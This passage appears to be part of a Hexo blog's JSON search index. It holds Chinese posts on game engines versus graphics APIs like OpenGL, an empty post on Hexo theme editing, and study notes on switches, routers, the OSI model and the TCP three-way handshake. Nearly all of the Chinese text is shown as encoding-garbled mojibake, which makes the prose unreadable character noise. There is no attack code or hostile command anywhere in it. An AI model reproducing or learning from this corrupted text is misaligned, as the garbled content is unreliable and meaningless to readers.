ã€‚è€Œæ˜¯åœ¨æ¸¸æˆå¼•æ“æä¾›çš„åŸºç¡€å¥—ä»¶ä¸Šç”¨c++æˆ–c#è¿™ç±»çš„é«˜çº§ç¨‹åºè¯­è¨€ç¼–å†™æ¸¸æˆé€»è¾‘ã€‚ä½ ç”¨è¿™äº›é«˜çº§ç¨‹åºè¯­è¨€å’Œæ¸¸æˆå¼•æ“æ‰“äº¤é“ï¼Œæ¸¸æˆå¼•æ“è´Ÿè´£å’Œå›¾å½¢APIæ‰“äº¤é“ï¼Œå›¾å½¢APIå’Œä½ çš„CPUå’Œæ˜¾å¡æ‰“äº¤é“ã€‚å½“ç„¶ï¼Œæ¸¸æˆå¼•æ“ä¹Ÿä¸åªæ˜¯å°è£…äº†ä¸å›¾å½¢ç›¸å…³çš„æ“ä½œï¼Œä¹Ÿå°è£…äº†å¾ˆå¤šæ¸¸æˆä¸­éƒ½éœ€è¦ç”¨åˆ°çš„ç‰©ç†æ“ä½œï¼Œä¾‹å¦‚æ¸¸æˆç‰©ä½“ä¸­çš„ç¢°æ’ç³»ç»Ÿï¼Œè¿˜å°è£…äº†ä¸€äº›äººæœºäº¤äº’çš„æ“ä½œä¾‹å¦‚å’Œæ‰‹æŸ„é”®ç›˜é¼ æ ‡ç­‰å¤–è®¾æ‰“äº¤é“ã€‚è¯¸å¦‚æ­¤ç±»çš„ï¼Œæ¸¸æˆå¼•æ“å°†å¤§å¤šæ•°æ¸¸æˆéƒ½éœ€è¦ç”¨åˆ°çš„æ“ä½œå°è£…èµ·æ¥æ–¹ä¾¿ç¨‹åºå‘˜è°ƒç”¨ã€‚æœ€ç®€å•çš„ï¼Œåœ¨unityé‡Œé¢ä½ æƒ³è¦è®©ä½ æŒ‰ä¸‹wé”®æ—¶ï¼Œä½ çš„äººç‰©ä»¥æ¯ç§’5mçš„é€Ÿåº¦å‘zè½´æ­£æ–¹å‘è·‘ï¼Œåªéœ€è¦åœ¨ä½ çš„äººç‰©ä¸ŠæŒ‚ä¸€ä¸ªç»§æ‰¿äº†monobehaviourçš„è„šæœ¬ï¼Œåœ¨updateå‡½æ•°é‡Œå†™ä¸‹è¿™ä¹ˆä¸€è¡Œä»£ç å°±è¡Œï¼šifï¼ˆInput.Getkey(&quot;w&quot;)ï¼‰&#123;transform.z+=5*0.02//å‡è®¾å¸§é—´éš”ä¸º0.02ç§’ï¼Œå³æ¯ç§’50å¸§&#125;é‚£ä¹ˆç”±äºupdateå‡½æ•°æ¯ä¸€å¸§æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ä¸€ç§’åä½ çš„äººç‰©çš„ä½ç½®ç¡®ç¡®å®å®åœ°å‰è¿›äº†5ç±³ã€‚å½“ç„¶ï¼Œè¿™ä¹ˆå¹²ä½ ä¼šçœ‹åˆ°ä½ çš„äººç‰©èº«ä½“ä¸€åŠ¨ä¸åŠ¨åœ°åŒ€é€Ÿå‰è¿›äº†5ç±³ï¼Œå¦‚æœä½ éœ€è¦è®©äººç‰©å˜é€Ÿè¿åŠ¨ï¼Œä»¥åŠè®©ä»–èƒ½ç”¨ä¸Šç¾æœ¯äººå‘˜è®¾è®¡çš„å¥”è·‘åŠ¨ç”»ï¼Œé‚£å°±éœ€è¦æ›´å¤æ‚çš„ä»£ç æ¥å †ç Œä»¥å®Œæˆå¤æ‚çš„æ¸¸æˆé€»è¾‘ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæ¸¸æˆå¼•æ“ç»™ä½ æä¾›çš„æ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„æ¡†æ¶ã€‚æ¸¸æˆå¼•æ“å¹¶ä¸æ˜¯åªæœ‰å›¾å½¢åŒ–çš„æ‹–æ¥æ‹–å»çš„é¼ æ ‡æ“ä½œï¼Œè™½ç„¶unreal engineçš„è“å›¾å’Œunityçš„ä¸€äº›æ’ä»¶ç¡®å®èƒ½å¤Ÿè®©æ–°æ‰‹ä¸ç”¨æ•²ä¸€è¡Œä»£ç å°±å†™å‡ºä¸€ä¸ªçœ‹èµ·æ¥å¾ˆæ£’çš„æ¸¸æˆï¼Œä½†å°è£…å±‚æ¬¡è¶Šé«˜ï¼Œä¹Ÿå°±æ„å‘³ç€ä¸§å¤±äº†æ›´å¤šçš„è‡ªç”±åº¦ã€‚åªæ˜¯é¼ æ ‡æ‹–æ¥æ‹–å»æ˜¯æ»¡è¶³ä¸äº†å¾ˆå¤šåœºæ™¯ä¸‹çš„å¼€å‘éœ€æ±‚çš„ã€‚è€Œå¦ä¸€ä¸ªæç«¯å°±æ˜¯åªé‡‡å–åƒopenglè¿™ç±»çš„å›¾å½¢APIä»é›¶å¼€å§‹åšæ¸¸æˆã€‚ä½ å¯ä»¥æŠŠopenglç®€å•åœ°ç†è§£ä¸ºä¸€å †æä¾›äº†ä¸å›¾å½¢ç›¸å…³çš„å‡½æ•°ã€‚ä½ å¯ä»¥è°ƒç”¨è¿™äº›å‡½æ•°åœ¨å±å¹•ä¸Šç”»ç‚¹ï¼Œç”»çº¿ï¼Œç”»ä¸‰è§’å½¢ï¼Œä»è€Œç”»å‡ºå„ç§å„æ ·çš„å¤šé¢ä½“ã€‚ 1ä¸å¤ªä¸“ä¸šåœ°è¯´ï¼Œå°±åƒä½ å‘å‘½ä»¤è¡Œè¾“å‡ºè¦æ ‡å‡†è¾“å…¥è¾“å‡ºAPIï¼ˆåƒprintfï¼‰ä¸€æ ·ï¼Œç»˜åˆ¶å›¾å½¢ä¹Ÿéœ€è¦å›¾å½¢åº“APIï¼Œæ¯”å¦‚OpenGLã€DirectXç­‰ï¼Œä»£ç è´Ÿè´£æè¿°è¦ç»˜åˆ¶çš„ä¸œè¥¿ï¼Œé€šè¿‡è¿™äº›APIä¸ç¡¬ä»¶äº¤äº’ï¼Œæ¯”å¦‚äº¤ä»˜ç»™æ˜¾å¡ï¼Œç„¶åæ˜¾å¡å°±å°†ä»£ç æè¿°çš„ä¸œè¥¿ç»˜åˆ¶å‡ºæ¥ï¼Œè¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œå½“ç„¶ï¼Œå®é™…æµç¨‹æ²¡é‚£ä¹ˆç®€å•ï¼Œä¼šæœ‰å¾ˆå¤šç»†èŠ‚ï¼Œè¿™é‡Œåªè¯´ä¸ªå¤§æ¦‚ GTAç½ªæ¶éƒ½å¸‚æºä»£ç è§£è¯»ç¬¬ä¸€æœŸï¼ˆä¸»å‡½æ•°ã€åˆå§‹åŒ–é€»è¾‘ï¼‰æ¸²æŸ“å¼•æ“å¼€å‘è€…è§£è¯»Ræ˜Ÿä»£ç _å“”å“©å“”å“©bilibili_ç½ªæ¶éƒ½å¸‚ æœ¬æ–‡ç« æ¥è‡ªbç«™è§†é¢‘ä¸‹çš„è¯„è®ºã€‚","categories":[],"tags":[]},{"title":"å…³äºhexoä¸»é¢˜ä¿®æ”¹","slug":"å…³äºhexoä¸»é¢˜ä¿®æ”¹","date":"2023-12-02T12:11:16.000Z","updated":"2024-01-21T16:44:51.402Z","comments":true,"path":"2023/12/02/å…³äºhexoä¸»é¢˜ä¿®æ”¹/","link":"","permalink":"http://example.com/2023/12/02/%E5%85%B3%E4%BA%8Ehexo%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"ç½‘ç»œå·¥ç¨‹å¸ˆçŸ¥è¯†","slug":"ç½‘ç»œå·¥ç¨‹å¸ˆçŸ¥è¯†","date":"2023-12-01T16:16:43.000Z","updated":"2024-01-21T16:46:20.055Z","comments":true,"path":"2023/12/02/ç½‘ç»œå·¥ç¨‹å¸ˆçŸ¥è¯†/","link":"","permalink":"http://example.com/2023/12/02/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9F%A5%E8%AF%86/","excerpt":"å› ä¸ºè¦æ··é¥­åƒï¼Œè¢«è¿«å­¦ä¹ ç½‘ç»œçŸ¥è¯†ï¼Œé¡ºä¾¿äº†è§£ä¸€ä¸‹ç‰©ç†çš„ç½‘ç»œç»“æ„ ç”³æ˜å› ä¸ºæ˜¯è‡ªå·±ç”¨æ¥å­¦ä¹ çš„ï¼Œå¤§éƒ¨åˆ†å‰è¾ˆéƒ½è¿›è¡Œäº†å¾ˆå¥½çš„æ€»ç»“ï¼Œæˆ‘ä¼šå°†äº’è”ç½‘å„ç§èµ„æ–™æ•´åˆèµ·æ¥,å†åŠ ä¸Šè‡ªå·±çš„ç†è§£æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä»…ä¾›ä¸ªäººå­¦ä¹ ç”¨é€” æ­£æ–‡å¸¸è§çš„ç½‘ç»œè®¾å¤‡","text":"å› ä¸ºè¦æ··é¥­åƒï¼Œè¢«è¿«å­¦ä¹ ç½‘ç»œçŸ¥è¯†ï¼Œé¡ºä¾¿äº†è§£ä¸€ä¸‹ç‰©ç†çš„ç½‘ç»œç»“æ„ ç”³æ˜å› ä¸ºæ˜¯è‡ªå·±ç”¨æ¥å­¦ä¹ çš„ï¼Œå¤§éƒ¨åˆ†å‰è¾ˆéƒ½è¿›è¡Œäº†å¾ˆå¥½çš„æ€»ç»“ï¼Œæˆ‘ä¼šå°†äº’è”ç½‘å„ç§èµ„æ–™æ•´åˆèµ·æ¥,å†åŠ ä¸Šè‡ªå·±çš„ç†è§£æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä»…ä¾›ä¸ªäººå­¦ä¹ ç”¨é€” æ­£æ–‡å¸¸è§çš„ç½‘ç»œè®¾å¤‡ 1.ç½‘ç»œäº¤æ¢æœºäº¤æ¢æœºä½¿ç”¨å†…å®¹å¯å¯»å€å­˜å‚¨å™¨(Content Addressable Memory, CAM), å› æ­¤å¯ä»¥è®°ä½è®¾å¤‡æ‰€æ’å…¥çš„ç«¯å£ã€‚æ€ç§‘å…¬å¸ç”Ÿäº§çš„äº¤æ¢æœºè¢«è®¾è®¡å¯ç”¨äºä»å°å‹æœºæ„åˆ°æœ‰æ•°åƒå°è®¾å¤‡çš„å¤§å‹ä¼ä¸šç½‘ç»œã€‚ äº¤æ¢æœºçš„åŸºæœ¬åŠŸèƒ½æ˜¯åˆ©ç”¨è®¾å¤‡çš„ MAC åœ°å€ï¼ˆç¬¬äºŒå±‚ï¼‰å’Œ IP åœ°å€ï¼ˆç¬¬ä¸‰å±‚ï¼‰æ¥è¿è¡Œï¼Œå®ƒä»¬ä¹Ÿèƒ½å®Œæˆæ›´ä¸ºå¤æ‚çš„ä¸€äº›å·¥ä½œï¼Œæ¯”å¦‚åŒ…æ‹¬åŸºäº permit/denyï¼ˆè¿è¡Œæˆ–è®¿é—®ï¼‰ã€åè®®åŠç«¯å£å·ï¼ˆç¬¬å››å±‚ï¼‰ï¼Œè¿˜æœ‰ç»¼åˆå„å±‚åŠå…¶å®ƒæ–¹é¢çš„ç­–ç•¥å’Œè§„åˆ™çš„å¤„ç†åˆ—è¡¨ï¼ˆporcessing listsï¼‰ã€‚ æ—©æœŸç‰ˆæœ¬çš„äº¤æ¢æœºåˆè¢«å«åšç½‘æ¡¥ã€‚ç½‘æ¡¥æŸ¥çœ‹æ•°æ®å¸§çš„æºç«¯å£å’Œ MAC åœ°å€ï¼Œä»¥å»ºç«‹ä¸€ä¸ªè¡¨å¹¶åšå‡ºè½¬å‘å†³å®šã€‚åœ¨ç½‘æ¡¥ä¸Šï¼Œæœ‰ç›¸åº”è½¯ä»¶æ¥è®¿é—®è¿™ä¸ªè¡¨ï¼Œåœ¨äº¤æ¢æœºä¸Šï¼Œåˆ™æ˜¯ç”±ç¡¬ä»¶ï¼ˆä¸“ç”¨é›†æˆç”µè·¯ï¼Œ Application Specific Integreated Chips, ASICï¼‰å»è®¿é—® CAM è¡¨ã€‚å› æ­¤äº¤æ¢æœºå¯ä»¥çœ‹æˆæ˜¯ä¸€å°å¤šç«¯å£ç½‘æ¡¥ã€‚ é‡‡è¡Œäº¤æ¢æœºå¯ä»¥å°†ä½ çš„ç½‘ç»œåˆ’åˆ†æˆæ›´å°çš„ã€æ›´å¯ç®¡ç†çš„éƒ¨åˆ†ï¼ˆå°±æ˜¯ç½‘æ®µï¼Œsegmentsï¼‰ã€‚è¿›è€Œå…è®¸å•ä½å†…éƒ¨çš„ä¸åŒéƒ¨é—¨ï¼Œæ¯”å¦‚äººåŠ›èµ„æºã€è´¢åŠ¡ã€æ³•åŠ¡ç­‰ç­‰ï¼Œå¾—ä»¥åŒæ—¶åœ¨å„è‡ªçš„ç½‘æ®µä¸Šå·¥ä½œï¼Œè¿™æ˜¯ååˆ†æœ‰ç”¨çš„ï¼Œå› ä¸ºåŒä¸€éƒ¨é—¨çš„è®¾å¤‡å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯ç”¨äºå„è‡ªä¹‹é—´çš„é€šä¿¡ã€‚ é€šè¿‡äº¤æ¢æœºï¼Œä½ è¿˜å¯ä»¥æ›´å¥½åœ°ä½¿ç”¨ IP ç”µè¯ï¼Œå› ä¸ºäº¤æ¢æœºç«¯å£èƒ½å¤Ÿé€šè¿‡ç«¯å£ä¸ºå…¶ä¾›ç”µï¼ˆä½¿ç”¨ PoE æ¥å£ï¼‰ã€‚åŸºæœ¬çš„ç½‘ç»œäº¤æ¢æœºç”¨äºï¼š 1.è¿æ¥è¯¸å¦‚æ‰“å°æœºå’Œ PC è¿™æ ·çš„ç½‘ç»œè®¾å¤‡ 2.èµ‹äºˆç½‘ç»œæœåŠ¡å™¨å’Œè·¯ç”±å™¨ç½‘ç»œè®¿é—® 3.ä½¿ç”¨ VLAN å¯¹ç½‘ç»œè¿›è¡Œåˆ’åˆ† VLAN å°±æ˜¯è™šæ‹Ÿå±€åŸŸç½‘ã€‚ 2.ç½‘ç»œè·¯ç”±å™¨ä½œä¸ºä¸€åæ€ç§‘å·¥ç¨‹å¸ˆï¼Œä½ å°†è€—è´¹å¤§é‡æ—¶é—´æ¥å¯¹è·¯ç”±å™¨è¿›è¡Œå®‰è£…ã€é…ç½®ä»¥åŠæ•…éšœæ’é™¤ã€‚ä¸ºæ­¤ï¼ŒCCNA å¤§çº²è¶…è¿‡åŠæ•°çš„å†…å®¹éƒ½æ˜¯ç”¨äºå­¦ä¹ è·¯ç”±å™¨é…ç½®çš„ã€‚ è·¯ç”±å™¨æ˜¯ç”¨äºå»ºç«‹ç½‘ç»œçš„è®¾å¤‡ã€‚ä¸è´Ÿè´£åŒä¸€ç½‘ç»œä¸Šçš„è®¾å¤‡ç›¸äº’é€šä¿¡çš„äº¤æ¢æœºä¸åŒï¼Œè·¯ç”±å™¨å®ç°ä¸åŒç½‘ç»œä¸Šçš„è®¾å¤‡ä¹‹é—´çš„é€šä¿¡ã€‚è€æ—§å‹å·çš„è·¯ç”±å™¨ä¸Šåªæœ‰ç«¯å£ï¼Œè¿™äº›ç«¯å£éƒ½æ˜¯ç‰©ç†å†…å»ºä¸å…¶ä¸­ï¼Œå›ºå®šåœ¨ä¸»æ¿ä¸Šçš„ã€‚è¿™æ ·çš„è·¯ç”±å™¨ä»ç„¶æ—¶ä¸æ—¶çš„å¯ä»¥è§åˆ°ï¼Œä½†ç°ä»£ç½‘ç»œéœ€è¦è·¯ç”±å™¨å…·å¤‡ IP ç”µè¯ã€äº¤æ¢åŠå®‰å…¨ä»¥åŠèƒ½å¤Ÿè¿æ¥åˆ°ä¸åŒç±»å‹ç”µè®¯å…¬å¸çš„åŠŸèƒ½ã€‚å› æ­¤ï¼Œè·¯ç”±å™¨æ˜¯æ¨¡å—åŒ–çš„äº†ï¼Œè¿™å°±æ˜¯è¯´ä½ æœ‰è·¯ç”±å™¨æœºæ¶å’Œä¸€äº›ç©ºç€çš„æ’æ§½ï¼Œèƒ½å¤Ÿè¿æ¥å¤§é‡çš„è·¯ç”±æˆ–äº¤æ¢æ¨¡å—ã€‚ è·¯ç”±å™¨ï¼Œrouters äº¤æ¢æœºï¼Œrouters æœ‰é˜²ç«å¢™çš„è·¯ç”±å™¨ æ— çº¿è·¯ç”±å™¨ å¤šå±‚äº¤æ¢æœº é˜²ç«å¢™ å±€åŸŸç½‘å’Œå¹¿åŸŸç½‘æ‹“æ‰‘ æ‹“æ‰‘ ç‰©ç† é€»è¾‘ æ˜Ÿå½¢ æ˜Ÿå½¢ æ€»çº¿ ä»¤ç‰Œç¯ æ˜Ÿå½¢ ç¯å½¢ ç‚¹å¯¹ç‚¹ æ€»çº¿ æ€»çº¿ FDDI ç¯å½¢ ç¯å½¢ OSI å’Œ TCP æ¨¡å‹123456789å¼€æ”¾æ ‡å‡†äº’è¿ï¼ˆOpen Standards Interconnection, OSIï¼‰æ˜¯æœ‰å›½é™…æ ‡å‡†åŒ–ç»„ç»‡åˆ›å»ºçš„ã€‚ä¼´éšæŠ€æœ¯å–·å‘ï¼Œç½‘ç»œè®¾å¤‡å’Œç½‘ç»œè½¯ä»¶è¡Œä¸šå…´èµ·äº†å‡ å®¶å·¨å¤´ï¼ŒåŒ…æ‹¬æ€ç§‘ã€å¾®è½¯ã€Novellã€IBMã€æƒ æ™®ã€è‹¹æœä»¥åŠå…¶å®ƒå‡ å®¶å…¬å¸ã€‚æ¯å®¶éƒ½æœ‰è‡ªå·±çš„çº¿ç¼†å’Œç«¯å£ç±»å‹ï¼Œå…è®¸å„è‡ªçš„å•†ä¸šæ€§åè®®ã€‚æ­¤æ—¶ï¼Œå¦‚ä½ ä»ä¸€å®¶ä¹°è·¯ç”±å™¨ã€å¦ä¸€å®¶ä¹°äº¤æ¢æœºï¼Œåˆä»åˆ«å®¶ä¹°æœåŠ¡å™¨ï¼Œå°±ä¼šå‡ºç°å…¼å®¹æ€§é—®é¢˜ã€‚æœ‰ä¸€äº›å¤„ç†è¿™äº›é—®é¢˜çš„é€šå®¹åŠæ³•ï¼Œæ¯”å¦‚åœ¨ç½‘ç»œä¸Šéƒ¨ç½²ç½‘å…³æ¥è½¬æ¢ä¸åŒçš„åè®®ï¼Œè¿™ä¼šå¯¼è‡´æ€§èƒ½ä¸Šçš„ç“¶é¢ˆï¼ˆæ¯”å¦‚ç½‘ç»œæ…¢é€Ÿéƒ¨åˆ†ï¼‰å¹¶ä¼šä»¤åˆ°æ•…éšœæ’é™¤ååˆ†å›°éš¾å’Œè´¹æ—¶ã€‚æœ€ç»ˆï¼Œå‚å•†ä»¬ä¸å¾—ä¸è¾¾æˆä¸€ä¸ªåœ¨å„è‡ªäº§å“ä¸Šéƒ½èƒ½å·¥ä½œçš„é€šç”¨æ ‡å‡†ï¼Œä¸€å¥—å«åš TCP/IP çš„å…è´¹åè®®åŒ…ã€‚æœ€åï¼Œé‚£äº›æœªèƒ½é‡‡è¡Œ TCP/IP çš„å‚å•†å¤±å»å¸‚åœºä»½é¢ï¼Œèµ°å‘ç ´äº§ã€‚ISO åˆ›å»ºå‡º OSI æ¨¡å‹ï¼Œä»¥åŠ©åŠ›äºå„å‚å•†å°±é€šç”¨æ ‡å‡†è¾¾æˆä¸€è‡´ï¼Œå®ç°å‚å•†ä¹‹é—´çš„å…¼å®¹ã€‚æ­¤æ¨¡å‹åŒ…æ‹¬äº†å°†æ€»å¤šç½‘ç»œåŠŸèƒ½åˆ†è§£ä¸ºä¸€å¥—é€»è¾‘åˆ†å±‚ï¼Œæˆ–é€šä¿—åœ°ç§°ä¸ºå±‚çš„ä¸œè¥¿ã€‚å„å±‚åªéœ€å®Œæˆå…¶ç‰¹å®šçš„ä¸€äº›åŠŸèƒ½ï¼Œæ¯”å¦‚è¯´ä½ çš„å…¬å¸ä¸“æ³¨äºé˜²ç«å¢™ï¼Œé‚£ä¹ˆè¿™äº›é˜²ç«å¢™å°†è‡ªç„¶åœ°ä¸å…¶å®ƒå‚å•†çš„è®¾å¤‡ä¸€èµ·å·¥ä½œã€‚æ­¤æ¨¡å‹çš„ä¼˜åŠ¿åœ¨äºæ¯ä»¶è®¾å¤‡è®¾è®¡ç”¨æ¥å‡ºè‰²å®Œæˆä¸€ä¸ªè§’è‰²ï¼Œè€Œéä¸å……åˆ†åœ°å®Œæˆå¤šä¸ªè§’è‰²ã€‚å®¢æˆ·å¯ä»¥æ ¹æ®å…¶è§£å†³æ–¹æ¡ˆé€‰å‡ºæœ€å¥½çš„è®¾å¤‡ï¼Œè€Œä¸ç”¨æ­»æ “åœ¨ä¸€å®¶å‚å•†é‚£é‡Œã€‚åŒæ—¶æ•…éšœæ’é™¤ä¹Ÿå˜å¾—æ›´ä¸ºå®¹æ˜“ï¼Œå› ä¸ºç¡®å®šçš„å‡ºé”™å¯è¢«è¿½è¸ªåˆ°å…·ä½“çš„æŸå±‚ã€‚OSI æ¨¡å‹å°†æ‰€æœ‰ç½‘ç»œåŠŸèƒ½åˆ’åˆ†ä¸ºä¸ƒä¸ªä¸åŒçš„å±‚ã€‚è¯¥å±‚æ¬¡åŒ–æ¨¡å‹ä»ç¬¬ä¸ƒå±‚ä¸€è·¯å»å¾€ç¬¬ä¸€å±‚ã€‚é‚£äº›ç¦»ç”¨æˆ·æ›´è¿‘ã€æ›´ä¸ºå¤æ‚çš„åŠŸèƒ½ï¼Œåœ¨é¡¶éƒ¨ï¼Œä¸€ç›´åˆ°å¤„äºåº•å±‚çš„ç½‘ç»œçº¿ç¼†è§„æ ¼ï¼Œå¦‚åŒè¡¨ å±‚ å±‚å 7 åº”ç”¨å±‚ï¼ŒApplication 6 è¡¨ç¤ºå±‚, Presentation 5 ä¼šè¯å±‚, Session 4 ä¼ è¾“å±‚, Transport 3 ç½‘ç»œå±‚, Network 2 æ•°æ®é“¾è·¯å±‚, Data Link 1 ç‰©ç†å±‚, Physical â€œAll People Seem To Need Data Processingâ€ åœ¨æ•°æ®ä¸ºé€šè¿‡ç‰©ç†ç½‘ç»œä»‹è´¨ä¼ è¾“è€Œè‡ªé¡¶å±‚ä¼ è‡³åº•å±‚æ—¶ï¼Œæ•°æ®è¢«æ”¾å…¥ä¸åŒçš„é€»è¾‘æ•°æ®å¥—ç›’å­ã€‚å°½ç®¡æˆ‘ä»¬å¸¸æŠŠè¿™äº›æ•°æ®ç›’å­ç§°ä½œâ€œåŒ…ï¼ˆpacketsï¼‰â€, å®é™…ä¸Šæ ¹æ®å…¶å¤„äº OSI ä¸åŒçš„å±‚è€Œæœ‰ä¸åŒçš„åç§°ã€‚ä» OSI æ¨¡å‹å¾€ä¸‹çš„æ•°æ®å¤„ç†ï¼Œå«åšå°è£…ã€‚è€Œå¾€ä¸Šçš„å¤„ç†ä¸­ä»ç›’å­é‡Œå–å‡ºæ•°æ®çš„è¿‡ç¨‹ï¼Œå«åšè§£å°è£…ã€‚ ç¬¬ä¸ƒå±‚ â€“ åº”ç”¨å±‚è¿™æ˜¯åˆ°ä½ æˆ‘è¿™äº›ç»ˆç«¯ç”¨æˆ·æœ€è¿‘çš„å±‚ã€‚åº”ç”¨å±‚å¹¶éæ“ä½œç³»ç»Ÿï¼Œä½†å®ƒé€šå¸¸æä¾›äº†è¯¸å¦‚ e-mail(SMTP ä»¥åŠ POP3)ã€web æµè§ˆï¼ˆä½¿ç”¨ HTTPï¼‰ã€ä»¥åŠæ–‡ä»¶ä¼ è¾“æœåŠ¡ï¼ˆä½¿ç”¨ FTPï¼‰ã€‚åº”ç”¨å±‚å†³å®šäº†èµ„æºçš„å¯ç”¨æ€§ã€‚ ç¬¬å…­å±‚â€“è¡¨ç¤ºå±‚è¡¨ç¤ºå±‚å°†æ•°æ®æä¾›ç»™åº”ç”¨å±‚ã€‚å¤šåª’ä½“æŠ€æœ¯å·¥ä½œåœ¨è¿™ä¸€å±‚ï¼Œä½ å¯ä»¥æƒ³åˆ° MP4ã€JPEGã€GIF ç­‰ç­‰ã€‚è€ŒåŠ å¯†ã€è§£å¯†ä»¥åŠæ•°æ®å‹ç¼©éƒ½å‘ç”Ÿåœ¨è¿™ä¸€å±‚ã€‚ ç¬¬äº”å±‚â€“ä¼šè¯å±‚ä¼šè¯å±‚çš„è§’è‰²æ˜¯å»ºç«‹ã€ç®¡ç†åŠä¸­æ–­è®¾å¤‡ä¹‹é—´çš„ä¼šè¯ã€‚è¿™äº›åŠ¨ä½œå‘ç”Ÿåœ¨é€»è¾‘é“¾è·¯ä¸Šï¼Œè€ŒçœŸæ­£å¹²çš„äº‹æƒ…æ˜¯å°†ä¸¤ä¸ªè½¯ä»¶åº”ç”¨ç¨‹åºè¿æ¥èµ·æ¥ã€‚SQLã€RPC ä»¥åŠ NFS éƒ½å·¥ä½œäºä¼šè¯å±‚ã€‚ ç¬¬å››å±‚â€“ä¼ è¾“å±‚ä¼ è¾“å±‚çš„è§’è‰²æ˜¯å°†æ¥è‡ªæ›´é«˜å±‚çš„æ•°æ®åˆ†æ‹†æˆè¢«ç§°ä¸ºæ•°æ®æ®µï¼ˆsegmentsï¼‰çš„æ›´å°ç‰‡ã€‚è™šç”µè·¯ï¼ˆvirtual circuitsï¼‰åœ¨è¿™é‡Œå»ºç«‹ï¼Œåœ¨è®¾å¤‡ä¹‹é—´èƒ½å¤Ÿé€šä¿¡ä¹‹é—´æœ‰èµ–äºè™šç”µè·¯çš„å»ºç«‹ã€‚ åœ¨æ•°æ®å¾—ä»¥è·¨ç½‘ç»œä¼ è¾“å‰ï¼Œä¼ è¾“å±‚éœ€è¦ç¡®è®¤å¤šå°‘æ•°æ®èƒ½å‘å¾€è¿œç«¯è®¾å¤‡ã€‚è¿™å–å†³äºç«¯åˆ°ç«¯é“¾è·¯çš„é€Ÿç‡å’Œå¯é æ€§ã€‚å¦‚ä½ æœ‰ä¸€æ¡é«˜é€Ÿé“¾è·¯ï¼Œè€Œç»ˆç«¯ç”¨æˆ·åªæœ‰ä¸€æ¡ä½é€Ÿé“¾è·¯ï¼Œæ•°æ®ä»ç„¶éœ€è¦ä»¥è¾ƒå°æ•°æ®å—è¿›è¡Œå‘é€ã€‚ ä»¥ä¸‹æ˜¯ä¸‰ç§æ§åˆ¶æ•°æ®æµçš„æ–¹æ³•ï¼š æµæ§ flow control çª—å£æœºåˆ¶ windowing é€šå‘Šæœºåˆ¶ acknowledgements æµæ§å¦‚å‘å¾€æ¥æ”¶ç³»ç»Ÿçš„ä¿¡æ¯å¤šäºå®ƒæ‰€èƒ½å¤„ç†çš„é‡æ—¶ï¼Œå®ƒå°†è¯·æ±‚å‘é€ç³»ç»Ÿæš‚åœä¸€æ®µæ—¶é—´ã€‚è¿™ä¸€èˆ¬å‘ç”Ÿåœ¨ä¸€æ®µä½¿ç”¨å®½å¸¦è€Œå¦ä¸€ç«¯ä½¿ç”¨æ‹¨å·ä¸Šç½‘çš„æ—¶å€™ã€‚è¿™ä¸ªç”¨äºé€šçŸ¥å…¶å®ƒè®¾å¤‡åœæ­¢çš„åŒ…å«åšæºæŠ‘åˆ¶æ¶ˆæ¯ï¼ˆa source quench messageï¼‰ã€‚ çª—å£æœºåˆ¶çª—å£æœºåˆ¶ä¸‹ï¼Œæ¯ä¸ªç³»ç»Ÿå°±èƒ½åœ¨æ”¶åˆ°åº”ç­”ï¼ˆacknowledgementï¼‰å‰å‘é€å¤šå°‘æ•°æ®è¾¾æˆä¸€è‡´ã€‚â€çª—å£â€éšç€æ•°æ®çš„ä¼ è¾“æ—¶å¼€æ—¶åˆï¼Œä»¥ç»´æŒä¸€ä¸ªæŒç»­çš„æ•°æ®æµã€‚ é€šå‘Šæœºåˆ¶åœ¨æ”¶åˆ°ä¸€å®šæ•°é‡çš„æ•°æ®æ®µåï¼Œæ¥æ”¶ç«¯éœ€è¦å°±è¿™äº›æ•°æ®æ®µçš„å®‰å…¨æŠµè¾¾å’Œé¡ºåºæ­£ç¡®ï¼Œé€šå‘Šå‘é€ç«¯ã€‚ 1234567è¿™äº›éƒ½æ˜¯åœ¨ä¸€ä¸ªå«åšä¸‰æ¬¡æ¡æ‰‹ï¼ˆa three-way handshakeï¼‰çš„è¿‡ç¨‹ä¸­è¾¾æˆä¸€è‡´ã€‚ä½ è¦å‘å‡ºä¸€ä¸ªåŒ…æ¥å»ºç«‹ä¼šè¯ã€‚ç¬¬ä¸€ä¸ªåŒ…å«åšåŒæ­¥(synchronise, SYN)åŒ…ã€‚è¿œç«¯è®¾å¤‡ä»¥åŒæ­¥åº”ç­”ï¼ˆa synchronise acknowledgement, SYN-ACKï¼‰åŒ…äºˆä»¥å›åº”ã€‚ç¬¬ä¸‰æ­¥çš„åº”ç­”åŒ…ï¼ˆacknowledgement, ACKï¼‰çš„å‘å‡ºæ ‡å¿—ç€ä¼šè¯çš„å»ºç«‹ã€‚è¿™éƒ½æ˜¯é€šè¿‡ TCP ä¸šåŠ¡å®Œæˆçš„ã€‚ä¼ è¾“å±‚åŒ…å«äº†å¥½å‡ ä¸ªåè®®ï¼Œå…¶ä¸­æœ€ç†ŸçŸ¥çš„æ˜¯ä¼ è¾“æ§åˆ¶åè®®ï¼ˆTranmission Control Protocol, TCPï¼‰å’Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼ˆUser Datagram Protocol, UDPï¼‰, å®ƒä»¬éƒ½æ˜¯ TCP/IP åè®®åŒ…çš„ç»„æˆéƒ¨åˆ†ã€‚è¿™ä¸ªåè®®åŒ…å› ä¸ºæ˜¯äº’è”ç½‘æ‰€ä½¿ç”¨çš„æ ‡å‡†è€Œç›¸å½“å‡ºåã€‚TCP æ˜¯é¢å‘è¿æ¥çš„åè®®ã€‚å®ƒä½¿ç”¨äº†ä¸‰æ¬¡æ¡æ‰‹ã€çª—å£æœºåˆ¶ä»¥åŠå…¶å®ƒæŠ€å·§æ¥ä¿è¯æ•°æ®å®‰å…¨åœ°åˆ°è¾¾å…¶ç›®çš„åœ°ã€‚æœ‰è®¸å¤šåè®®éƒ½ä½¿ç”¨äº† TCPï¼Œ 